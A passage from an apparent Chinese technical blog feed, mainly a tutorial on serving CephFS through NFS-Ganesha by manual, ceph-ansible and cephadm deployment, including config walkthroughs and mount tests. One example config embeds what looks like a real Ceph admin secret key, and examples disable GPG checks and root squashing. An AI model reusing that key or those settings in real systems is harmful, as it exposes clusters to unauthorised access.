class="hljs-comment"># 查看 pod 状态</span><br>kubectl get storageclass,pvc,pod -n default<br></code></pre></td></tr></table></figure><h1 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h1><ul><li><a href="https://github.com/IBM/ibm-spectrum-scale-csi">https://github.com/IBM/ibm-spectrum-scale-csi</a></li><li><a href="https://www.ibm.com/docs/en/scalecsi/2.11.0">https://www.ibm.com/docs/en/scalecsi/2.11.0</a></li><li><a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=storage-scale-container-storage-interface-driver-211">https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=storage-scale-container-storage-interface-driver-211</a></li><li><a href="https://www.ibm.com/docs/en/scalecsi/2.13.0?topic=213-using-storage-scale-container-storage-interface-driver">https://www.ibm.com/docs/en/scalecsi/2.13.0?topic=213-using-storage-scale-container-storage-interface-driver</a></li><li><a href="https://www.ibm.com/docs/en/scalecsi/2.14.0?topic=STXKQY_CSI_SHR_2.14.0/com.ibm.spectrum.scale.csi.v21r3.doc/bl1csi_using.htm">https://www.ibm.com/docs/en/scalecsi/2.14.0?topic=STXKQY_CSI_SHR_2.14.0/com.ibm.spectrum.scale.csi.v21r3.doc/bl1csi_using.htm</a></li><li><a href="https://www.ibm.com/docs/en/scalecsi/2.14.0?topic=STXKQY_CSI_SHR_2.14.0/com.ibm.spectrum.scale.csi.v21r3.doc/bl1csi_config_csi_storageclass.htm">https://www.ibm.com/docs/en/scalecsi/2.14.0?topic=STXKQY_CSI_SHR_2.14.0/com.ibm.spectrum.scale.csi.v21r3.doc/bl1csi_config_csi_storageclass.htm</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 分布式存储 </tag>
            
            <tag> GPFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CephFS 对接 NFS-Ganesha 使用教程</title>
      <link href="/2024/08/10/cephfs-nfs-ganesha/"/>
      <url>/2024/08/10/cephfs-nfs-ganesha/</url>
      
        <content type="html"><![CDATA[<p>考虑到目前 Ceph 的集群部署主要有两种方式: ceph-ansible 和 cephadm ，因此这里主要会针对这两种方式来详细解释如何使用 CephFS NFS 功能。</p><h1 id="一、NFS-Ganesha-介绍"><a href="#一、NFS-Ganesha-介绍" class="headerlink" title="一、NFS-Ganesha 介绍"></a>一、NFS-Ganesha 介绍</h1><h2 id="1-1、NFS-协议介绍"><a href="#1-1、NFS-协议介绍" class="headerlink" title="1.1、NFS 协议介绍"></a>1.1、NFS 协议介绍</h2><p>关于不同 NFS 版本的关联文档参见: <a href="https://github.com/nfs-ganesha/nfs-ganesha/blob/next/src/doc/USEFUL-RFCs.txt">src&#x2F;doc&#x2F;USEFUL-RFCs.txt</a></p><table><thead><tr><th align="center">协议版本</th><th align="center">发布时间</th><th align="center">相关文档</th></tr></thead><tbody><tr><td align="center">NFSv2</td><td align="center">1989 年</td><td align="center"><a href="https://www.rfc-editor.org/info/rfc1094">RFC 1092</a></td></tr><tr><td align="center">NFSv3</td><td align="center">1995 年</td><td align="center"><a href="https://www.rfc-editor.org/info/rfc1813">RFC 1813</a></td></tr><tr><td align="center">NFSv4(NFSv4.0)</td><td align="center">2002 年</td><td align="center"><a href="https://www.rfc-editor.org/info/rfc3530">RFC 3530</a>, <a href="https://www.rfc-editor.org/info/rfc7530">RFC 7530</a>, <a href="https://www.rfc-editor.org/info/rfc7531">RFC 7531</a>, <a href="https://datatracker.ietf.org/doc/rfc7931/">RFC 7931</a></td></tr><tr><td align="center">NFSv4(NFSv4.1)</td><td align="center">2010 年</td><td align="center"><a href="https://www.rfc-editor.org/info/rfc5661">RFC 5661</a>, <a href="https://www.rfc-editor.org/info/rfc5662">RFC 5662</a>, <a href="https://www.rfc-editor.org/info/rfc5663">RFC 5663</a>, <a href="https://www.rfc-editor.org/info/rfc5664">RFC 5664</a>, <a href="https://datatracker.ietf.org/doc/rfc8435/">RFC 8435</a></td></tr><tr><td align="center">NFSv4(NFSv4.2)</td><td align="center">2016 年</td><td align="center"><a href="https://datatracker.ietf.org/doc/rfc7862/">RFC 7862</a>, <a href="https://datatracker.ietf.org/doc/rfc7863/">RFC 7863</a></td></tr></tbody></table><p><strong>不同版本的协议特点:</strong></p><ul><li><code>NFSv2</code> : <ul><li>无状态协议；</li><li>第一个以RFC形式发布的版本，实现了基本的功能；</li><li>每次读写操作中传输数据的最大长度上限值为 8192 字节；</li><li>文件名称长度限制上限为 255 字节；</li><li>文件长度进行了限制，上限值为 0x7FFFFFFF （即 2147483647 ，约 2GB ）；</li><li>文件句柄长度固定为 32 字节；</li><li>只支持同步写，如果客户端向服务器端写入数据，服务器必须将数据写入磁盘中才能发送应答消息；</li><li>无 uid&#x2F;gid 访问权限前置检查，直接执行，如果遇到权限不满足则返回报错；</li></ul></li><li><code>NFSv3</code> : <ul><li>无状态协议，需要 NLM(Network Lock Manager) 协助才能实现文件锁功能；</li><li>取消了每次读写操作中传输数据的最大长度限制；</li><li>取消了文件名称长度限制；</li><li>取消了文件长度限制；</li><li>文件句柄长度可变，上限值是 64 字节；</li><li>支持异步写操作，服务器只需要将数据写入缓存中就可以发送应答信息了；</li><li>增加了 COMMIT 请求， COMMIT 请求可以将服务器缓存中的数据刷新到磁盘中；</li><li>增加了 ACCESS 请求， ACCESS 用来检查用户的访问权限。因为服务器端可能进行 uid 映射，因此客户端的 uid&#x2F;gid 可能不能正确反映用户的访问权限；</li></ul></li><li><code>NFSv4(NFSv4.0)</code> : <ul><li>有状态的协议，自身实现了文件锁功能和获取文件系统根节点功能，不需要 NLM 和 MOUNT 协议协助；</li><li>增加了安全性，支持 RPCSEC-GSS 身份认证；</li><li>只提供了两个请求 NULL 和 COMPOUND ，所有的操作都整合进了 COMPOUND 中，客户端可以根据实际请求将多个操作封装到一个 COMPOUND 请求中，增加了灵活性；</li><li>服务器端必须设置一个根文件系统(fsid&#x3D;0)，其他文件系统挂载在根文件系统上导出；</li><li>支持 delegation ；</li><li>修改了文件属性的表示方法，将文件属性划分成了三类：Mandatory Attributes(文件的基本属性，所有的操作系统必须支持这些属性)，Recommended Attributes(NFS建议的属性，如果可能操作系统尽量实现这些属性)，Named Attributes(操作系统可以自己实现的一些文件属性) ；</li></ul></li><li><code>NFSv4(NFSv4.1)</code> : <ul><li>支持并行存储；</li></ul></li><li><code>NFSv4(NFSv4.2)</code> :</li></ul><h2 id="1-2、NFS-Ganesha-软件安装"><a href="#1-2、NFS-Ganesha-软件安装" class="headerlink" title="1.2、NFS-Ganesha 软件安装"></a>1.2、NFS-Ganesha 软件安装</h2><h3 id="1-2-1、编译安装"><a href="#1-2-1、编译安装" class="headerlink" title="1.2.1、编译安装"></a>1.2.1、编译安装</h3><p>测试机器的环境为 CentOS 8.5.2111 。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装基础软件</span><br><span class="hljs-comment"># librgw2-devel 用于生成 FSAL_RGW 模块; libcephfs-devel 用于生成 FSAL_CEPH 模块</span><br>dnf install -y gcc git cmake autoconf libtool bison flex doxygen \<br>               openssl-devel gcc-c++ krb5-libs krb5-devel libuuid-devel \<br>               nfs-utils librgw2-devel libcephfs-devel userspace-rcu \<br>               userspace-rcu-devel<br><br><span class="hljs-comment"># 拉取代码</span><br>git <span class="hljs-built_in">clone</span> https://github.com/nfs-ganesha/nfs-ganesha.git<br><span class="hljs-built_in">cd</span> ./nfs-ganesha<br>git checkout -f V4.1<br>git branch<br>git submodule update --init --recursive<br> <br><span class="hljs-comment"># 编译</span><br><span class="hljs-built_in">cd</span> src/<br><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-built_in">cd</span> build/<br><span class="hljs-comment"># -DUSE_FSAL_RGW=ON 用于生成 FSAL_RGW 模块; -DUSE_FSAL_CEPH=ON 用于生成 FSAL_CEPH 模块</span><br>cmake -DUSE_FSAL_RGW=ON -DUSE_FSAL_CEPH=ON ../<br></code></pre></td></tr></table></figure><h3 id="1-2-2、源仓库安装"><a href="#1-2-2、源仓库安装" class="headerlink" title="1.2.2、源仓库安装"></a>1.2.2、源仓库安装</h3><p><strong>nfs-ganesha 软件版本 v4.x 源配置文件:</strong> (支持的最高版本为 V4.4)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[nfs-ganesha-stable]<br>name=nfs-ganesha stable from aliyun<br>baseurl=https://mirrors.aliyun.com/centos-vault/8-stream/storage/x86_64/nfsganesha-4<br>enabled=1<br>gpgcheck=0<br>priority=0<br></code></pre></td></tr></table></figure><p><strong>nfs-ganesha 软件版本 v5.x.x 源配置文件:</strong> (支持的最高版本为 V5.7)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[nfs-ganesha-stable]<br>name=nfs-ganesha stable from aliyun<br>baseurl=https://mirrors.aliyun.com/centos-vault/8-stream/storage/x86_64/nfsganesha-5<br>enabled=1<br>gpgcheck=0<br>priority=0<br></code></pre></td></tr></table></figure><p><strong>安装命令:</strong> (使用 nfs-ganesha 软件版本 v5.x.x 源配置文件进行安装)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 针对于 cephfs nfs: nfs-ganesha-ceph ， nfs-ganesha-rados-grace</span><br><span class="hljs-comment"># 针对于 rgw nfs: nfs-ganesha-rgw ， nfs-ganesha-rados-grace ， nfs-ganesha-rados-urls ， ceph-radosgw</span><br>dnf install -y nfs-ganesha nfs-ganesha-ceph nfs-ganesha-rados-grace nfs-ganesha-rgw nfs-ganesha-rados-urls ceph-radosgw nfs-ganesha-utils<br><br><span class="hljs-comment"># 验证安装</span><br><span class="hljs-built_in">which</span> ganesha.nfsd<br></code></pre></td></tr></table></figure><h2 id="1-3、配置解析"><a href="#1-3、配置解析" class="headerlink" title="1.3、配置解析"></a>1.3、配置解析</h2><p>下面的配置文件为 <a href="https://github.com/nfs-ganesha/nfs-ganesha/tree/V5.7">V5.7</a> 软件版本中的配置文件，配置文件位于 &#x2F;etc&#x2F;ganesha&#x2F;ganesha.conf 。完整的配置文件内容如下: (参考：<a href="https://github.com/nfs-ganesha/nfs-ganesha/blob/V5.7/src/config_samples/ceph.conf">src&#x2F;config_samples&#x2F;ceph.conf</a>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">NFS_CORE_PARAM<br>&#123;<br>    Enable_NLM = false;<br>    Enable_RQUOTA = false;<br>    Protocols = 4;<br>&#125;<br><br>NFSv4<br>&#123;<br>    # Delegations = false;<br>    RecoveryBackend = rados_ng;<br>    Minor_Versions =  1,2;<br>&#125;<br><br>MDCACHE &#123;<br>    Dir_Chunk = 0;<br>&#125;<br><br>EXPORT<br>&#123;<br>    Export_ID=100;<br>    Protocols = 4;<br>    Transports = TCP;<br>    Path = /;<br>    Pseudo = /cephfs_a/;<br>    Access_Type = RW;<br>    Attr_Expiration_Time = 0;<br>    # Delegations = R;<br>    # Squash = root;<br>    FSAL &#123;<br>        Name = CEPH;<br>        # Filesystem = &quot;cephfs_a&quot;;<br>        # User_Id = &quot;ganesha&quot;;<br>        # Secret_Access_Key = &quot;YOUR SECRET KEY HERE&quot;;<br>    &#125;<br>&#125;<br><br>CEPH<br>&#123;<br>    # Ceph_Conf = /etc/ceph/ceph.conf;<br>    # umask = 0;<br>&#125;<br><br>RADOS_KV<br>&#123;<br>    # Ceph_Conf = /etc/ceph/ceph.conf;<br>    # UserId = &quot;ganesharecov&quot;;<br>    # pool = &quot;nfs-ganesha&quot;;<br>    # nodeid = hostname.example.com<br>&#125;<br><br>RADOS_URLS<br>&#123;<br>    # Ceph_Conf = /etc/ceph/ceph.conf;<br>    # UserId = &quot;ganeshaurls&quot;;<br>    # watch_url = &quot;rados://pool/namespace/object&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>配置解析如下:</strong></p><ul><li><code>NFS_CORE_PARAM</code>: <ul><li><code>Enable_NLM</code> ： 如果 NLM 被禁用，Ganesha 可以提前结束 NFS 的宽限期。</li><li><code>Enable_RQUOTA</code> ：CephFS 无法支持基于每个用户 ID 的配额。</li><li><code>Protocols</code> ：在此配置中，我们仅导出 NFSv4。实际上，最好使用 NFSv4.1+ 以利用会话功能。</li></ul></li><li><code>NFSv4</code> :<ul><li><code>Delegations</code> : 现代版本的 libcephfs 支持委派，尽管目前不推荐在集群配置中使用。默认情况下，它们是禁用的，但可以在单例或主动&#x2F;被动配置中重新启用。</li><li><code>RecoveryBackend</code> ：可以使用任何恢复后端，但能够将其存储在 RADOS 中是一个很好的功能，使得迁移守护程序到另一个主机变得容易。对于单节点或主动&#x2F;被动配置，推荐使用 rados_ng 驱动。对于主动&#x2F;主动集群配置，可以使用 rados_cluster 后端。可选值如下:<ul><li><code>fs</code> ： 默认值，使用文件系统（File System）作为恢复后端，这意味着NFS-Ganesha会将必要的状态信息存储在本地文件系统上。例如，导出配置、租约和其他NFS相关状态被保存在磁盘上的特定目录下，以便在服务重启时恢复。</li><li><code>fs_ng</code> ： 这个是对 fs 后端的一个改进版本，它提供了更高效和扩展性更好的文件系统持久化方式。此选项同样利用本地文件系统来存储状态，但可能包含了针对性能优化和更大规模部署的增强特性。</li><li><code>rados_kv</code> ： 指定 Ceph RADOS Key-Value存储作为恢复后端。在这种模式下，NFS-Ganesha 的状态信息以键值对的形式存储在Ceph集群中的一个或多个对象存储池中。这种方式允许状态信息跨多个节点进行分布，并提供高可用性和容错能力。</li><li><code>rados_ng</code> ： 是专门针对 Ceph 的一种更高级别的恢复后端实现，相较于 rados_kv 可能具有更高的性能和更完善的集成。它可能使用了 Ceph 提供的更为复杂的数据结构和服务来进行元数据的存储和恢复。</li><li><code>rados_cluster</code> ：</li></ul></li><li><code>Minor_Versions</code> ： NFSv4.0 客户端不发送 RECLAIM_COMPLETE，因此如果有的话，我们最终需要等待整个宽限期结束。避免它们。</li></ul></li><li><code>MDCACHE</code> ：libcephfs 客户端在可能情况下会积极缓存信息，因此 ganesha 主动缓存相同的对象几乎没有好处。这样做还可能损害缓存一致性。在此，我们尽可能地禁用属性和目录缓存。<ul><li><code>Dir_Chunk</code> ：目录缓存块大小默认设为 0 ，可能表示不启用目录缓存或缓存策略特殊处理。</li></ul></li><li><code>EXPORT</code> ：<ul><li><code>Export_ID</code> ：每个导出项都需要有唯一的 Export_Id 。</li><li><code>Protocols</code> ：建议为 4 。</li><li><code>Transports</code> ：NFSv4 只允许 TCP 传输。</li><li><code>Path</code> ：相关 CephFS 存储池中的导出项路径。允许从 CephFS 中导出子目录。</li><li><code>Pseudo</code> ：伪根路径。这是导出将在 NFS 伪根命名空间中出现的地方。</li><li><code>Access_Type</code> ：读写操作类型。</li><li><code>Attr_Expiration_Time</code> ：属性超时时间。</li><li><code>Delegations</code> : 是否启动读取委托。 libcephfs v13.0.1 及更高版本允许 ceph 客户端设置委托。虽然可以允许 RW 委托，但不建议启用它们，除非 ganesha 获得 CB_GETATTR 支持。还要注意，委托在集群配置中可能不安全，因此最好在解决此问题之前禁用它们。</li><li><code>Squash</code> ：NFS 服务器通常会将来自 root 用户的传入请求 “压缩” 到 nobody 用户。可以禁用此功能，但目前我们将其保持启用状态。</li><li><code>FSAL</code> ：<ul><li><code>Name</code> ：定义 NFS Ganesha 使用的后端。允许的值为 CEPH（表示 CephFS）或 RGW（表示对象网关）。根据您的选择，必须在 policy.cfg 中定义 role-mds 或 role-rgw。</li><li><code>Filesystem</code> ：Ceph 文件系统有一个与之关联的名称字符串，并且现代版本的 libcephfs 可以根据名称挂载它们。默认情况下，挂载集群中的默认文件系统（通常是第一个创建的）。</li><li><code>User_Id</code> ：配置了访问 Ceph 集群所需的用户 ID 。</li><li><code>Secret_Access_Key</code> ：配置了访问 Ceph 集群所需的密钥。</li></ul></li></ul></li><li><code>CEPH</code> ：<ul><li><code>Ceph_Conf</code> ：指定访问 Ceph 集群所需要的配置文件，主要的是其中 mon host 配置信息。</li><li><code>umask</code> ： 设置了 CephFS 上新创建文件和目录的默认权限掩码。</li></ul></li><li><code>RADOS_KV</code> ： <ul><li><code>Ceph_Conf</code> ： 指向 Ceph 配置文件。</li><li><code>UserId</code>  ： 给 Ganesha 使用的 Ceph 用户 ID 。</li><li><code>pool</code> ： 是 Ceph 集群中用于存储 Ganesha 状态数据的池名。</li><li><code>nodeid</code> ： 设置为特定节点主机名，可能用于区分不同 Ganesha 实例的状态数据。</li></ul></li><li><code>RADOS_URLS</code> ： <ul><li><code>Ceph_Conf</code>  ： 指向 Ceph 配置文件。</li><li><code>UserId</code> ： 用于监视 URL 变更的 Ceph 用户 ID 。</li><li><code>watch_url</code> ： 指定了要监视的对象存储位置，当该位置的内容发生变化时， Ganesha 可以据此自动更新配置或状态。</li></ul></li></ul><h1 id="二、NFS-Ganesha-部署使用"><a href="#二、NFS-Ganesha-部署使用" class="headerlink" title="二、NFS-Ganesha 部署使用"></a>二、NFS-Ganesha 部署使用</h1><h2 id="2-1、通过手动部署使用"><a href="#2-1、通过手动部署使用" class="headerlink" title="2.1、通过手动部署使用"></a>2.1、通过手动部署使用</h2><p>通过手动方式部署 nfs-ganesha 的优点是部署方式独立便捷，但是缺点是无法通过 ceph dashboard 进行管控，需要手动管理 ha 和 keepalived 等组件等，手动维护的成本较高。</p><h3 id="2-1-1、部署服务"><a href="#2-1-1、部署服务" class="headerlink" title="2.1.1、部署服务"></a>2.1.1、部署服务</h3><p><strong>修改 &#x2F;etc&#x2F;ganesha&#x2F;ganesha.conf 如下:</strong> (配置模板为 <a href="https://github.com/nfs-ganesha/nfs-ganesha/blob/V5.7/src/config_samples/ceph.conf">src&#x2F;config_samples&#x2F;ceph.conf</a>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">NFS_CORE_PARAM<br>&#123;<br>    Enable_NLM = false;<br>    Enable_RQUOTA = false;<br>    Protocols = 4;<br>&#125;<br><br>NFSv4<br>&#123;<br>    RecoveryBackend = rados_ng;<br>    Minor_Versions =  1,2;<br>&#125;<br><br>MDCACHE &#123;<br>    Dir_Chunk = 0;<br>&#125;<br><br>EXPORT<br>&#123;<br>    Export_ID=100;<br>    Protocols = 4;<br>    Transports = TCP;<br>    Path = /;<br>    Pseudo = /cephfs/;<br>    Access_Type = RW;<br>    Attr_Expiration_Time = 0;<br>    Squash = no_root_squash;<br>    FSAL &#123;<br>        Name = CEPH;<br>        Filesystem = &quot;cephfs&quot;;<br>        User_Id = &quot;admin&quot;;<br>        Secret_Access_Key = &quot;AQBWaZFodyUoNRAAAtRrRqJZu89Qka+TA1qmmg==&quot;;<br>    &#125;<br>&#125;<br><br>CEPH<br>&#123;<br>    Ceph_Conf = /etc/ceph/ceph.conf;<br>&#125;<br><br>RADOS_KV<br>&#123;<br>&#125;<br><br>RADOS_URLS<br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>启动 nfs-ganesha 服务:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化运行环境</span><br><span class="hljs-built_in">mkdir</span> -p /var/run/ganesha<br><br><span class="hljs-comment"># 前台运行</span><br>ganesha.nfsd -f /etc/ganesha/ganesha.conf -L /var/log/ganesha/ganesha.log -N info -F<br><br><span class="hljs-comment"># 后台运行</span><br>ganesha.nfsd -f /etc/ganesha/ganesha.conf -L /var/log/ganesha/ganesha.log -N info<br><br><span class="hljs-comment"># 查看服务是否正在运行</span><br>ps aux | grep ganesha<br><br><span class="hljs-comment"># 其他操作</span><br><span class="hljs-comment"># 启动 nfs-ganesha 依赖的服务</span><br><span class="hljs-comment"># systemctl start rpcbind.service</span><br><span class="hljs-comment"># systemctl start rpc-statd.service</span><br><br><span class="hljs-comment"># 查看依赖服务是否正在启动</span><br><span class="hljs-comment"># systemctl status rpcbind.service</span><br><span class="hljs-comment"># systemctl status rpc-statd.service</span><br></code></pre></td></tr></table></figure><h3 id="2-1-2、挂载客户端"><a href="#2-1-2、挂载客户端" class="headerlink" title="2.1.2、挂载客户端"></a>2.1.2、挂载客户端</h3><p>客户端机器挂载通过 nfs 导出的 cephfs 服务:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载客户端</span><br><span class="hljs-comment"># 注意: 这里的 /cephfs 要与 Pseudo 中的配置保持一致</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs-nfs<br>mount -t nfs4 -o nfsvers=4.1,proto=tcp,rw 10.10.0.1:/cephfs /mnt/cephfs-nfs<br><br><span class="hljs-comment"># 查看挂载目录的数据</span><br><span class="hljs-built_in">ls</span> -al /mnt/cephfs-nfs<br><br><span class="hljs-comment"># 读写测试</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/cephfs-nfs/testfile1 oflag=direct status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/cephfs-nfs/testfile1 bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><br><span class="hljs-comment"># 取消挂载</span><br>umount /mnt/cephfs-nfs<br></code></pre></td></tr></table></figure><h2 id="2-2、通过-ceph-ansible-部署使用"><a href="#2-2、通过-ceph-ansible-部署使用" class="headerlink" title="2.2、通过 ceph-ansible 部署使用"></a>2.2、通过 ceph-ansible 部署使用</h2><p>除了使用手动的部署方式，对于之前通过使用 ceph-ansible 方式部署的集群，我们可以通过 ceph-ansible 来增加 nfs 模块来启用 nfs 服务。这种方式相比于手动部署的方式，会自动配置 nfs 相关组件的配置，并配置开机启动等。</p><p>这里使用的 ceph 版本为 v16.2.10 ，对应的 ceph-ansible 分支为 <a href="https://github.com/ceph/ceph-ansible/tree/stable-6.0">stable-6.0</a> 。 </p><h3 id="2-2-1、部署服务"><a href="#2-2-1、部署服务" class="headerlink" title="2.2.1、部署服务"></a>2.2.1、部署服务</h3><p><strong>修改 group_vars&#x2F;all.yml 配置文件，添加如下信息:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># nfs-ganesha</span><br><span class="hljs-attr">nfs_file_gw:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">nfs_obj_gw:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>修改 group_vars&#x2F;nfss.yml 配置文件，添加如下信息:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">dummy:</span><br><br><span class="hljs-comment"># nfs-ganesha</span><br><span class="hljs-attr">ceph_nfs_enable_service:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">ceph_nfs_log_file:</span> <span class="hljs-string">&quot;/var/log/ganesha/ganesha.log&quot;</span><br><span class="hljs-attr">ceph_nfs_rados_backend:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">ceph_nfs_rados_export_index:</span> <span class="hljs-string">&quot;ganesha-export-index&quot;</span><br><span class="hljs-attr">ceph_nfs_bind_addr:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><span class="hljs-attr">ceph_nfs_disable_caching:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-comment"># fsal ceph</span><br><span class="hljs-attr">ceph_nfs_ceph_pseudo_path:</span> <span class="hljs-string">&quot;/cephfile&quot;</span><br><span class="hljs-attr">ceph_nfs_ceph_protocols:</span> <span class="hljs-string">&quot;3,4&quot;</span><br><span class="hljs-attr">ceph_nfs_ceph_access_type:</span> <span class="hljs-string">&quot;RW&quot;</span><br><span class="hljs-attr">ceph_nfs_ceph_user:</span> <span class="hljs-string">&quot;admin&quot;</span><br><span class="hljs-attr">ceph_nfs_ceph_squash:</span> <span class="hljs-string">&quot;No_Root_Squash&quot;</span><br></code></pre></td></tr></table></figure><p><strong>修改 hosts.ini 配置文件，添加如下信息:</strong></p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[nfss]</span><br>host01<br>host02<br>host03<br></code></pre></td></tr></table></figure><p><strong>部署命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 新增 nfs 服务</span><br>ansible-playbook -vvvv -i hosts.ini site.yml --<span class="hljs-built_in">limit</span> nfss<br><br><br><span class="hljs-comment"># 注意: 由于当前的 ansible 脚本在安装依赖软件的时候区分了 cephfs 和 cephrgw ，</span><br><span class="hljs-comment">#       如果我们只启用 cephfs 时可能会导致缺失部分软件依赖包，从而导致 nfs-ganesha 服务</span><br><span class="hljs-comment">#       启动失败，为此我们可以稍后手动安装依赖包，并尝试手动启动 nfs-ganesha 服务。</span><br><span class="hljs-comment"># 参见: https://github.com/ceph/ceph-ansible/blob/stable-6.0/roles/ceph-nfs/tasks/pre_requisite_non_container_red_hat.yml#L41</span><br>dnf install -y nfs-ganesha-rados-urls<br>systemctl restart nfs-ganesha<br>systemctl status nfs-ganesha<br></code></pre></td></tr></table></figure><p><strong>ceph-ansible 部署 nfs 的关键流程:</strong> (以非容器化部署举例，执行入口位于 <a href="https://github.com/ceph/ceph-ansible/blob/stable-6.0/site.yml.sample#L299">stable-6.0&#x2F;site.yml.sample</a> )</p><ol><li>获取节点信息，初始化基础环境等前置工作。</li><li>配置 yum 源，安装 nfs-ganesha 相关依赖软件（只有当 ceph_origin &#x3D; ‘repository’ 且 ceph_repository &#x3D; ‘community’ 或者 ‘dev’ 时才会配置机器上的源，如果 ceph_repository &#x3D; ‘custom’ 则需要手动配置机器上的 nfs-ganesha 的源）。</li><li>创建 nfs-ganesha 相关的配置文件，运行目录，systemd 启动文件等，然后启动服务。</li></ol><p><strong>部署后其中一个机器节点上的 nfs-ganesha 的格式化后的配置文件如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf"># Please do not change this file directly since it is managed by Ansible and will be overwritten<br>NFS_Core_Param<br>&#123;<br>    Bind_Addr=0.0.0.0;<br>&#125;<br><br>EXPORT_DEFAULTS &#123;<br>    Attr_Expiration_Time = 0;<br>&#125;<br><br>CACHEINODE &#123;<br>    Dir_Chunk = 0;<br>    NParts = 1;<br>    Cache_Size = 1;<br>&#125;<br><br>RADOS_URLS &#123;<br>    ceph_conf = &#x27;/etc/ceph/ceph.conf&#x27;;<br>    userid = &quot;admin&quot;;<br>&#125;<br>%url rados://cephfs_data/ganesha-export-index<br><br>NFSv4 &#123;<br>    RecoveryBackend = &#x27;rados_kv&#x27;;<br>    IdmapConf = &quot;/etc/ganesha/idmap.conf&quot;;<br>&#125;<br>RADOS_KV &#123;<br>    ceph_conf = &#x27;/etc/ceph/ceph.conf&#x27;;<br>    userid = &quot;admin&quot;;<br>    pool = &quot;cephfs_data&quot;;<br>&#125;<br><br>EXPORT<br>&#123;<br>    Export_id=20133;<br>    Path = &quot;/&quot;;<br>    Pseudo = /cephfile;<br>    Access_Type = RW;<br>    Protocols = 3,4;<br>    Transports = TCP;<br>    SecType = sys,krb5,krb5i,krb5p;<br>    Squash = No_Root_Squash;<br>    Attr_Expiration_Time = 0;<br>    FSAL &#123;<br>        Name = CEPH;<br>        User_Id = &quot;admin&quot;;<br>    &#125;<br>&#125;<br><br>LOG &#123;<br>    Facility &#123;<br>        name = FILE;<br>        destination = &quot;/var/log/ganesha/ganesha.log&quot;;<br>        enable = active;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-2、挂载客户端"><a href="#2-2-2、挂载客户端" class="headerlink" title="2.2.2、挂载客户端"></a>2.2.2、挂载客户端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载客户端</span><br><span class="hljs-comment"># 注意: 这里的 /cephfile 要与 ceph_nfs_ceph_pseudo_path 中的配置保持一致</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs-nfs<br>mount -t nfs4 -o nfsvers=4.1,proto=tcp,rw 10.10.0.1:/cephfile /mnt/cephfs-nfs<br><br><span class="hljs-comment"># 查看挂载目录的数据</span><br><span class="hljs-built_in">ls</span> -al /mnt/cephfs-nfs<br><br><span class="hljs-comment"># 读写测试</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/cephfs-nfs/testfile2 oflag=direct status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/cephfs-nfs/testfile2 bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><br><span class="hljs-comment"># 取消挂载</span><br>umount /mnt/cephfs-nfs<br></code></pre></td></tr></table></figure><h2 id="2-3、通过-cephadm-部署使用"><a href="#2-3、通过-cephadm-部署使用" class="headerlink" title="2.3、通过 cephadm 部署使用"></a>2.3、通过 cephadm 部署使用</h2><p>无论是通过手动部署还是通过 ceph-ansible 进行部署，最终都是部署了独立的 nfs-ganesha 服务，并没有与 ceph dashboard 联动起来，如果需要变更配置等操作只能从终端管理 nfs-ganesha，但是 cephadm 的部署方式可以实现了界面化的配置管理，更便捷，更直观。</p><p>这里使用 ceph v19.2.3 版本通过 cephadm 部署集群进行测试。</p><h3 id="2-3-1、部署服务"><a href="#2-3-1、部署服务" class="headerlink" title="2.3.1、部署服务"></a>2.3.1、部署服务</h3><p>建议直接 dashboard 按步骤来部署服务，同时下面也列出了一些相关的命令。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加 MDS 组件并创建文件系统</span><br>ceph fs volume create 